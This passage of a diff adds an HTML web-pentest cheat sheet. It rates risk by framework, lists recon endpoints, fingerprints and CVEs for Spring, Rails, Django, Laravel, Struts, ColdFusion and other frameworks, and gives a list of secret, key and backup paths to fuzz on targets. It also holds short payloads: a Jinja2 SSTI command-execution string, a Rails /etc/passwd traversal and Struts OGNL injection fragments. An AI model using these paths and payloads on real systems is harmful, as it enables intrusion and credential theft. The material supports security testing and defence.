+  <td><span class="risk risk-high">High</span><span class="reason">Manual auth guards (@UseGuards(AuthGuard)); easy to miss on individual routes.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">@UseGuards(RolesGuard), @Roles() decorators. Common bug: guard registered globally but missing on new controllers.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">main.ts (bootstraps AppModule), app.module.ts (root module).</span></td>
+</tr>
+<tr>
+  <td class="framework">Nuxt.js</td>
+  <td><span class="reason">nuxt.config.ts / nuxt.config.js, .env, runtimeConfig (with public and private sections). server/ directory for API routes.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Vue escapes output; v-html is sink. SSR hydration mismatches can introduce issues.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">server/api/*.ts routes have full fs access; nuxt-content with user paths is a sink.</span></td>
+  <td><span class="risk risk-na">N/A</span><span class="reason">No server-side templating of user input by default.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">server/api/* routes have no built-in CSRF; devs must add nuxt-csurf or custom.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Server routes connect to DBs directly; Prisma/Drizzle usage requires same care as Next.js.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">H3 event.node.req.query parsing; duplicate param handling varies.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">$fetch / ofetch in server context makes external requests; SSR data fetching common SSRF surface.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">server/api/* needs explicit auth checks; no global middleware by default.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">server/middleware/*.ts for global; per-route checks required.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">app.vue (root), pages/*, server/api/*, server/middleware/*.</span></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 5: OTHER MODERN & LEGACY ========================= -->
+<h2 id="s5">5. Other Modern &amp; Legacy Frameworks <span class="tag">Go / Symfony / Struts / ColdFusion</span></h2>
+<table>
+  <colgroup>
+    <col style="width: 8%"><col style="width: 11%"><col style="width: 8%"><col style="width: 8%"><col style="width: 9%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 8%"><col style="width: 7%"><col style="width: 7%"><col style="width: 4%"><col style="width: 6%">
+  </colgroup>
+<thead>
+<tr>
+  <th>Framework</th>
+  <th>Config File &amp; Location</th>
+  <th>XSS</th>
+  <th>LFI</th>
+  <th>SSTI</th>
+  <th>CSRF</th>
+  <th>SQLi</th>
+  <th>Param Pollution</th>
+  <th>SSRF</th>
+  <th>IDOR</th>
+  <th>MFLAC</th>
+  <th>Lazy Load</th>
+  <th>Main File</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td class="framework">Go (Gin/Echo/Fiber)</td>
+  <td><span class="reason">Env vars, Viper (config.yaml), .env + godotenv, embed.FS for embedded config. go.mod, go.sum.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">html/template auto-escapes contextually; text/template does NOT &mdash; critical footgun when devs import wrong package.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">os.Open, ioutil.ReadFile, filepath.Join with user input; http.ServeFile path traversal.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">text/template.Execute with user-controlled template strings; html/template same if string concat used.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">No built-in CSRF in standard library or major frameworks; need gorilla/csrf or custom.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">database/sql parameterizes with ?/$1; sqlx, gorm, sqlc. String concat in db.Query() is sink.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Gin/Echo bind into structs with validation; minimal pollution surface.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">http.Get, http.Client with user URLs; no URL validation by default.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual everything; no built-in authz.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual middleware, per-route checks.</span></td>
+  <td><span class="reason">N/A</span></td>
+  <td><span class="reason">main.go</span></td>
+</tr>
+<tr>
+  <td class="framework">Symfony</td>
+  <td><span class="reason">.env, .env.local, config/packages/*.yaml, config/services.yaml, config/routes.yaml. public/index.php. src/Kernel.php.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Twig auto-escapes. Sinks: {{ var|raw }}, {% autoescape false %}.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Filesystem component, SplFileObject with user paths.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Twig SSTI via user input in template strings; Environment::createTemplate with user content.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Symfony Form component adds CSRF token automatically; CsrfTokenManager for custom forms.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">Doctrine ORM/DBAL parameterizes by default; native SQL with concat, DQL with string interpolation are sinks.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Request::get() can return unexpected types; strict bag access preferred.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Symfony HttpClient, Guzzle with user URLs.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Security Voters and ACLs, but must be checked per-resource.</span></td>
+  <td><span class="risk risk-low">Low</span><span class="reason">#[IsGranted] attribute, @Security annotation, firewall config via security.yaml.</span></td>
+  <td><span class="reason">Yes</span></td>
+  <td><span class="reason">public/index.php (entry), src/Kernel.php.</span></td>
+</tr>
+<tr>
+  <td class="framework">Struts 2 (Legacy)</td>
+  <td><span class="reason">struts.xml, struts.properties, struts-default.xml, web.xml. pom.xml (look for struts2-core).</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Tag libraries escape by default; &lt;s:property escape="false"&gt; is the sink.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Action file handling with user paths.</span></td>
+  <td><span class="risk risk-crit">Critical</span><span class="reason">OGNL injection is Struts' signature vulnerability &mdash; parameter names, Content-Type, namespace all classic vectors. Multiple unauth RCE CVEs.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Token interceptor available but must be enabled per action.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Depends on DAO layer; Struts itself doesn't mitigate.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">ParametersInterceptor binds request params to action properties &mdash; mass assignment vector.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Java HTTP clients with user URLs.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual authz in action methods.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Interceptor stacks must include auth; easy to bypass.</span></td>
+  <td><span class="reason">N/A</span></td>
+  <td><span class="reason">web.xml (DispatcherServlet), struts.xml (actions)</span></td>
+</tr>
+<tr>
+  <td class="framework">ColdFusion (Legacy)</td>
+  <td><span class="reason">neo-runtime.xml, neo-security.xml, password.properties in /cfusion/lib/. Application.cfc, Application.cfm.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">&lt;cfoutput&gt; does NOT auto-escape; EncodeForHTML() is manual.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">&lt;cffile&gt;, &lt;cfinclude&gt; with user paths; classic CF LFI vectors.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">CFML tag injection via user input in template evaluation.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">No built-in CSRF; custom token implementation required.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">&lt;cfquery&gt; with string concat; cfqueryparam is optional, not default.</span></td>
+  <td><span class="risk risk-mod">Moderate</span><span class="reason">Form/URL scope collision; parameter handling quirks.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">&lt;cfhttp&gt; with user URLs, historically exploited for internal scans.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Manual authz in every CFM/CFC.</span></td>
+  <td><span class="risk risk-high">High</span><span class="reason">Application.cfc onRequestStart hook commonly missing checks.</span></td>
+  <td><span class="reason">N/A</span></td>
+  <td><span class="reason">Application.cfc, index.cfm</span></td>
+</tr>
+</tbody>
+</table>
+
+<!-- ========================= SECTION 6: RECON & FINGERPRINTS ========================= -->
+<h2 id="s6">6. Framework Recon &amp; Fingerprinting <span class="tag">Identification / Endpoints / Notable CVEs</span></h2>
+<div class="cards">
+
+<div class="card">
+  <h3>Spring Boot</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>X-Application-Context</code> header. Whitelabel Error Page. <code>JSESSIONID</code> cookie. Spring stack traces in /error. <code>Server: Apache-Coyote</code> or no Server header. favicon hash often distinctive.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>application.properties</code>, <code>application.yml</code>, <code>application-prod.yml</code>, <code>bootstrap.yml</code>, <code>logback-spring.xml</code>. Main class: <code>{App}Application.java</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/actuator/env</code>, <code>/actuator/heapdump</code> (credential goldmine), <code>/actuator/trace</code>, <code>/actuator/httptrace</code>, <code>/actuator/mappings</code>, <code>/actuator/beans</code>, <code>/actuator/conditions</code>, <code>/actuator/configprops</code>, <code>/actuator/info</code>, <code>/actuator/loggers</code>, <code>/actuator/metrics</code>, <code>/actuator/threaddump</code>, <code>/actuator/jolokia/*</code> (Jolokia MBean = RCE), <code>/h2-console</code>, <code>/swagger-ui.html</code>, <code>/v3/api-docs</code>, <code>/error?trace=true</code>.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2022-22965</span> Spring4Shell (RCE via data binding + SpEL). <span class="cve">CVE-2022-22963</span> Spring Cloud Function SpEL. <span class="cve">CVE-2021-44228</span> Log4Shell. <span class="cve">CVE-2018-1270</span> SpEL STOMP RCE. <span class="cve">CVE-2017-8046</span> Spring Data REST. Jackson deserialization (commons-collections, c3p0). Exposed H2 console = RCE. Unauth /env → /refresh → property override RCE chain.</span>
+</div>
+
+<div class="card">
+  <h3>Ruby on Rails</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>_{appname}_session</code> cookie. <code>X-Runtime</code> header. <code>authenticity_token</code> hidden field in forms. Rails error pages ("We're sorry, but something went wrong"). ETag with distinctive Rails format. <code>X-Request-Id</code> UUID header.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>config/database.yml</code>, <code>config/secrets.yml</code> (&lt;Rails 5.2), <code>config/credentials.yml.enc</code>, <code>config/master.key</code> (decrypts credentials = full compromise), <code>Gemfile</code>, <code>Gemfile.lock</code>, <code>config/routes.rb</code>, <code>config/application.rb</code>, <code>config/environments/production.rb</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/rails/info/routes</code> (dev), <code>/rails/info/properties</code> (dev), <code>/rails/mailers</code> (dev), <code>/rails/conductor/action_mailbox/*</code> (dev), <code>/rails/active_storage/*</code>, <code>/assets/*.js.map</code> (source maps), <code>/packs/*.js.map</code> (webpacker).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><strong>Mass assignment</strong> (pre-strong_parameters or bypassed). <strong>YAML.load / Marshal.load RCE</strong>. <span class="cve">CVE-2019-5418</span> File Content Disclosure via Accept header <code>../../../etc/passwd{{</code>. <span class="cve">CVE-2022-32224</span> Marshal in session. <span class="cve">CVE-2013-0156</span> XML YAML param parsing RCE. ActiveRecord raw SQLi in <code>.where</code> / <code>.order</code> / <code>.find_by_sql</code>. <code>redirect_to</code> open redirect. <code>ERB.new(input).result</code> SSTI. Devise account enumeration.</span>
+</div>
+
+<div class="card">
+  <h3>Django</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>csrftoken</code> and <code>sessionid</code> cookies. Django admin HTML signature. "You're seeing this error because you have DEBUG = True" error page. <code>X-Frame-Options: DENY</code> (middleware default).</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>settings.py</code>, <code>local_settings.py</code>, <code>.env</code>, <code>manage.py</code>, <code>wsgi.py</code>, <code>asgi.py</code>, <code>urls.py</code>, <code>requirements.txt</code>, <code>Pipfile</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/admin/</code> (login page leaks Django version), <code>/admin/login/?next=/</code>, <code>/__debug__/</code> (django-debug-toolbar), <code>/static/admin/</code>, <code>/silk/</code> (django-silk profiler), <code>/api/schema/swagger-ui/</code> (DRF + drf-spectacular), <code>/api-auth/</code> (DRF browsable API).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2022-34265</span> SQL injection via Trunc/Extract. <span class="cve">CVE-2021-35042</span> QuerySet.order_by SQLi. <span class="cve">CVE-2019-19844</span> account takeover via password reset. <strong>DEBUG=True in prod</strong> exposes settings, SECRET_KEY, env vars. <code>@csrf_exempt</code> misuse. Pickle-based session backend + SECRET_KEY leak = RCE. SSTI when Jinja2 integration is added.</span>
+</div>
+
+<div class="card">
+  <h3>Laravel</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>laravel_session</code> cookie, <code>XSRF-TOKEN</code> cookie. "Whoops, looks like something went wrong" error page (Ignition). <code>X-Powered-By: PHP/*</code>. Ignition error page exposes framework version.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>.env</code>, <code>.env.backup</code>, <code>.env.production</code>, <code>config/*.php</code>, <code>composer.json</code>, <code>composer.lock</code>, <code>artisan</code>, <code>routes/web.php</code>, <code>routes/api.php</code>, <code>public/index.php</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/.env</code> (constant finding), <code>/storage/logs/laravel.log</code>, <code>/telescope</code> (if installed, huge info leak), <code>/horizon</code>, <code>/_ignition/execute-solution</code> (CVE-2021-3129), <code>/debugbar/open</code>, <code>/api/documentation</code> (L5-Swagger), <code>/nova</code> (Laravel Nova admin).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2021-3129</span> Ignition &lt;2.5.2 RCE (debug mode only). <span class="cve">CVE-2018-15133</span> unserialize via APP_KEY leak = RCE. <strong>APP_KEY leak = session forgery + RCE</strong>. <code>.env</code> exposure is rampant. <code>DB::raw()</code> / <code>whereRaw()</code> SQLi. Telescope/Debugbar exposed in prod. Mass assignment via <code>$fillable</code> mistakes.</span>
+</div>
+
+<div class="card">
+  <h3>Next.js</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>_next/static/</code> in source, <code>__NEXT_DATA__</code> script tag, <code>x-nextjs-*</code> headers, <code>x-powered-by: Next.js</code> (if not disabled), <code>/_next/image</code> image optimizer endpoint.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>next.config.js</code> / <code>next.config.ts</code>, <code>.env</code>, <code>.env.local</code>, <code>.env.production</code>, <code>package.json</code>, <code>tsconfig.json</code>, <code>middleware.ts</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/_next/static/chunks/*.js</code> (often contains API routes, env vars), <code>/_next/data/{buildId}/*.json</code> (getStaticProps/getServerSideProps data), <code>/_next/image?url=</code> (SSRF surface), <code>/api/*</code> (enumerate), <code>/api/auth/*</code> (NextAuth endpoints), source maps in dev.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2024-34351</span> SSRF via Server Actions. <span class="cve">CVE-2025-29927</span> middleware auth bypass via <code>x-middleware-subrequest</code> header. <span class="cve">CVE-2023-46298</span> missing auth cache poisoning. <span class="cve">CVE-2020-5284</span> path traversal. <code>/_next/image</code> SSRF with unvalidated domains. <code>NEXT_PUBLIC_*</code> env vars leak to client. getServerSideProps SSRF. On-demand ISR revalidation token leaks.</span>
+</div>
+
+<div class="card">
+  <h3>ASP.NET Core</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>.AspNetCore.Antiforgery.*</code> cookie, <code>.AspNetCore.Session</code>, <code>X-Powered-By: ASP.NET</code> (IIS), Kestrel server header, distinctive 404 / error pages.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>appsettings.json</code>, <code>appsettings.Development.json</code>, <code>appsettings.Production.json</code>, <code>launchSettings.json</code>, <code>web.config</code> (IIS), <code>Program.cs</code>, <code>.pdb</code> files (debug symbols).</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/swagger</code>, <code>/swagger/v1/swagger.json</code>, <code>/healthchecks-ui</code>, <code>/hangfire</code> (background job dashboard), <code>/_vs/</code> (Visual Studio debugger in dev), <code>/api/*</code>, exposed <code>appsettings.*.json</code>, <code>/.vs/</code> VS metadata.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2023-36038</span> DoS via form parsing. <span class="cve">CVE-2023-36558</span> Razor auth bypass. <span class="cve">CVE-2020-1108</span> DoS. ViewState deserialization (legacy WebForms). <code>BinaryFormatter</code> RCE. Kestrel HTTP/2 smuggling. Misconfigured CORS with <code>AllowAnyOrigin + AllowCredentials</code>. Missing <code>[Authorize]</code> on individual endpoints.</span>
+</div>
+
+<div class="card">
+  <h3>Flask</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>session</code> cookie signed with itsdangerous format (<code>.eJw...</code>), <code>Server: Werkzeug/*</code> or <code>gunicorn</code>. Default Werkzeug debug page if DEBUG=True.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>app.py</code>, <code>config.py</code>, <code>.env</code>, <code>wsgi.py</code>, <code>requirements.txt</code>, <code>instance/config.py</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/console</code> (Werkzeug debugger if DEBUG=True &mdash; <strong>direct RCE</strong>, protected by PIN that's brute-forceable with machine info leak), <code>/static/*</code>, <code>/admin/</code> (Flask-Admin), <code>/api/docs</code> (Flask-RESTX), stack traces on errors leak source paths.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><strong>Werkzeug debugger PIN bypass</strong> (predict PIN from <code>/etc/machine-id</code>, <code>uid</code>, mac address leaked via debug page). <strong>Jinja2 SSTI</strong> via <code>render_template_string(user_input)</code>: <code>{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}</code>. <code>SECRET_KEY</code> leak = session forgery. Pickle-based session backends + key leak = RCE.</span>
+</div>
+
+<div class="card">
+  <h3>FastAPI</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>/openapi.json</code> nearly always exposed. Pydantic validation error format <code>{"detail":[{"loc":..., "msg":..., "type":...}]}</code>. <code>Server: uvicorn</code> or <code>hypercorn</code>.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>main.py</code> or <code>app/main.py</code>, <code>.env</code>, pydantic <code>Settings</code> class in <code>app/core/config.py</code>, <code>requirements.txt</code>, <code>pyproject.toml</code>, <code>Dockerfile</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/docs</code> (Swagger UI), <code>/redoc</code> (ReDoc), <code>/openapi.json</code> (even when /docs is disabled &mdash; always check), <code>/health</code>, <code>/metrics</code> (Prometheus), enumerate all paths from openapi.json.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value">No built-in CSRF (cookie-auth apps vulnerable). Missing <code>Depends(auth)</code> on individual routes. Pydantic v1&rarr;v2 migration introduced strict-mode bugs. <code>response_model</code> leak when not specified. Raw SQL via SQLAlchemy <code>text()</code>. JWT implementation bugs (none algorithm, weak secret). Async SSRF via httpx.</span>
+</div>
+
+<div class="card">
+  <h3>NestJS</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value">Error response format <code>{"statusCode":...,"message":...,"error":...}</code>. <code>X-Powered-By: Express</code> (unless disabled). <code>/api</code> global prefix common.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>.env</code>, <code>nest-cli.json</code>, <code>tsconfig.json</code>, <code>package.json</code> (look for <code>@nestjs/*</code>), <code>main.ts</code>, <code>app.module.ts</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/api</code> (common global prefix), <code>/api-docs</code> or <code>/swagger</code> (if SwaggerModule enabled), <code>/graphql</code> (if GraphQLModule, check introspection with <code>IntrospectionQuery</code>), <code>/health</code> (Terminus module).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value">Missing <code>@UseGuards(AuthGuard)</code> on individual routes. <code>ValidationPipe</code> without <code>whitelist: true</code> allows mass assignment. CORS with <code>origin: true</code> + credentials. TypeORM/Prisma raw queries. Inherits Express CSRF issues. GraphQL introspection + unlimited query depth = DoS/info leak.</span>
+</div>
+
+<div class="card">
+  <h3>Nuxt.js</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>_nuxt/</code> static path in source, <code>__NUXT__</code> global script data, <code>&lt;div id="__nuxt"&gt;</code> root element, <code>X-Powered-By: Nuxt</code> (sometimes).</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>nuxt.config.ts</code> / <code>nuxt.config.js</code>, <code>.env</code>, <code>app.vue</code>, <code>package.json</code>, <code>server/tsconfig.json</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/_nuxt/*</code> assets (check for sourcemaps), <code>/api/_content/*</code> (@nuxt/content query endpoint), <code>/__nuxt_devtools__/*</code> (dev only, sometimes leaked in prod), SSR hydration data in <code>__NUXT__</code> script tag (frequently leaks API responses, runtime config, user data), <code>/server/api/*</code> enumeration.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><code>runtimeConfig.public</code> leak of sensitive values marked as "public". SSR SSRF via <code>server/api/*</code>. CSRF on server routes (no default protection). SSR cache poisoning. @nuxt/content query injection. Hydration mismatches exposing server state.</span>
+</div>
+
+<div class="card">
+  <h3>Go Web Frameworks</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value">Minimal. Gin: often no distinct Server header. Echo: similar. Fiber: <code>Server: Fiber</code> sometimes. Look for Go-distinctive panic stack traces, <code>net/http</code> error formatting.</span>
+  <span class="label">Config Files</span>
+  <span class="value">Env vars primarily, <code>config.yaml</code> (Viper), <code>.env</code> (godotenv), <code>go.mod</code>, <code>go.sum</code>, <code>embed.FS</code> for embedded configs. <code>main.go</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/debug/pprof/</code> (if <code>net/http/pprof</code> imported &mdash; exposes goroutines, heap, CPU, symbol info), <code>/debug/pprof/goroutine?debug=2</code>, <code>/debug/pprof/heap</code>, <code>/metrics</code> (Prometheus), <code>/healthz</code>, <code>/swagger/*</code> (swaggo).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><strong><code>text/template</code> vs <code>html/template</code></strong> &mdash; importing the wrong one = XSS. <code>json.Unmarshal</code> type confusion. <code>filepath.Join</code> does NOT prevent traversal (use <code>filepath.Clean</code> + prefix check). SSRF via <code>http.Get(userURL)</code> with no validation. <code>pprof</code> exposed publicly = memory disclosure. Race conditions in goroutines. XXE in <code>encoding/xml</code>.</span>
+</div>
+
+<div class="card">
+  <h3>Symfony</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>sf_redirect</code> cookie, <code>X-Debug-Token</code> header (dev), <code>X-Debug-Token-Link</code> (dev), Symfony profiler toolbar HTML, distinctive error pages.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>.env</code>, <code>.env.local</code>, <code>.env.local.php</code>, <code>config/packages/*.yaml</code>, <code>config/services.yaml</code>, <code>config/routes.yaml</code>, <code>src/Kernel.php</code>, <code>composer.json</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/_profiler/</code> (debug toolbar &mdash; full request/response/SQL/session access, HUGE leak), <code>/_profiler/phpinfo</code>, <code>/app_dev.php</code> (legacy dev front controller), <code>/_wdt/*</code> (web debug toolbar), <code>/config.php</code> (Symfony 2.x installer), <code>/_fragment</code> (ESI fragment).</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><strong>Exposed profiler in prod = full compromise</strong>. <span class="cve">CVE-2021-21424</span> HTTP request smuggling. <span class="cve">CVE-2019-10912</span> PhpBridgeSessionStorage deserialization. Twig SSTI via <code>{{ }}</code> in user input. <code>/_fragment</code> with <code>_controller</code> param = RCE if not signed. Doctrine DQL injection. <code>.env.local</code> and <code>.env.local.php</code> leaks.</span>
+</div>
+
+<div class="card">
+  <h3>Apache Struts 2 (Legacy)</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>.action</code> or <code>.do</code> URL extensions. "struts" in stack traces. OGNL expressions in error messages. Java ServletException wrappers.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>struts.xml</code>, <code>struts.properties</code>, <code>struts-default.xml</code>, <code>web.xml</code>, <code>pom.xml</code> (look for <code>struts2-core</code> dependency).</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value">Any <code>.action</code> endpoint. Test with OGNL payload in Content-Type header. Test parameter name injection: <code>?%23context['xwork.MethodAccessor.denyMethodExecution']=false</code>.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2017-5638</span> Equifax &mdash; Content-Type OGNL RCE (<code>%{(#_='multipart/form-data').(...)}</code>). <span class="cve">CVE-2018-11776</span> namespace OGNL RCE. <span class="cve">CVE-2013-2251</span> redirect/redirectAction OGNL. <span class="cve">CVE-2017-9805</span> REST plugin XStream deserialization. <span class="cve">CVE-2020-17530</span> forced OGNL double evaluation. <span class="cve">CVE-2023-50164</span> path traversal + RCE via file upload.</span>
+</div>
+
+<div class="card">
+  <h3>Adobe ColdFusion (Legacy)</h3>
+  <span class="label">Fingerprints</span>
+  <span class="value"><code>.cfm</code>, <code>.cfc</code>, <code>.cfml</code> URL extensions. <code>CFID</code> / <code>CFTOKEN</code> cookies. <code>Server: JRun</code>. "ColdFusion" mentioned in errors.</span>
+  <span class="label">Config Files</span>
+  <span class="value"><code>neo-runtime.xml</code>, <code>neo-security.xml</code>, <code>password.properties</code> (in /cfusion/lib/), <code>Application.cfc</code>, <code>Application.cfm</code>, <code>seed.properties</code>.</span>
+  <span class="label">Recon Endpoints</span>
+  <span class="value"><code>/CFIDE/administrator/</code> (admin panel), <code>/CFIDE/administrator/enter.cfm</code>, <code>/CFIDE/componentutils/</code>, <code>/CFIDE/adminapi/</code>, <code>/CFIDE/scripts/ajax/</code>, <code>/cf_scripts/</code>, <code>/WEB-INF/cfusion/lib/password.properties</code>, <code>/CFIDE/administrator/settings/mappings.cfm</code>.</span>
+  <span class="label">Notable CVEs &amp; Bug Classes</span>
+  <span class="value"><span class="cve">CVE-2023-26360</span> access control bypass + RCE (Adobe ColdFusion). <span class="cve">CVE-2013-0632</span> auth bypass via admin API. <span class="cve">CVE-2010-2861</span> admin LFI &rarr; password disclosure via null byte. <span class="cve">CVE-2009-2265</span> FCKeditor file upload. CFML tag injection via user input in <code>&lt;cfoutput&gt;</code>. SSRF via <code>&lt;cfhttp&gt;</code>. SQLi via <code>&lt;cfquery&gt;</code> (cfqueryparam is opt-in).</span>
+</div>
+
+</div>
+
+<!-- ========================= SECTION 7: CONFIG LEAK LIST ========================= -->
+<h2 id="s7">7. Config Leak Quick-Hunt List <span class="tag">Paths to fuzz on any target</span></h2>
+<div class="twocol">
+
+<div>
+<div class="label" style="color:#f5c26b;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;margin-bottom:6px;">Environment &amp; Secrets</div>
+<div class="codeblock">/.env
+/.env.local
+/.env.production
+/.env.backup
+/.env.example          <span class="comment"># structural leak</span>
+/.env.dev
+/.env.staging
+/config/master.key     <span class="comment"># Rails</span>
+/config/credentials.yml.enc
+/config/database.yml
+/config/secrets.yml
+/storage/logs/laravel.log
+/application.properties
+/application.yml
+/application-prod.yml
+/bootstrap.yml
+/appsettings.json
+/appsettings.Production.json
+/appsettings.Development.json
+/web.config            <span class="comment"># IIS</span>
+/settings.py
+/local_settings.py
+/config.php
+/wp-config.php
+/wp-config.php.bak
+/configuration.php     <span class="comment"># Joomla</span>
+/sites/default/settings.php   <span class="comment"># Drupal</span></div>
+</div>
+
+<div>
+<div class="label" style="color:#f5c26b;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;margin-bottom:6px;">VCS, Build &amp; Backup Leaks</div>
+<div class="codeblock">/.git/config
+/.git/HEAD
+/.git/index
+/.git/logs/HEAD
+/.gitignore            <span class="comment"># file enumeration</span>
+/.svn/entries
+/.svn/wc.db
+/.hg/hgrc
+/.bzr/
+/.DS_Store             <span class="comment"># macOS dir enum</span>
+/Thumbs.db
+/package.json
+/package-lock.json
+/yarn.lock
+/composer.json
+/composer.lock
+/Gemfile
+/Gemfile.lock
+/requirements.txt
+/Pipfile
+/Pipfile.lock
+/pyproject.toml
+/go.mod
+/go.sum
+/pom.xml
+/build.gradle
+/backup.zip
+/backup.sql
+/backup.tar.gz
+/dump.sql
+/db.sql
+/database.sql
+/.bash_history
+/.zsh_history
+/id_rsa
+/id_rsa.pub
+/authorized_keys
+/.npmrc
+/.pypirc
+/.dockerignore
+/Dockerfile
+/docker-compose.yml
+/.vscode/settings.json
+/.idea/workspace.xml</div>
+</div>
+
+</div>
+
+<div class="label" style="color:#f5c26b;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;font-weight:700;margin:14px 0 6px 0;">API Schema / Documentation Leaks</div>
+<div class="codeblock">/swagger            /swagger.json          /swagger-ui.html        /swagger/v1/swagger.json
+/api-docs           /v3/api-docs           /docs                   /redoc
+/openapi.json       /openapi.yaml          /api/swagger            /api/documentation
+/graphql            /graphiql              /playground             /altair
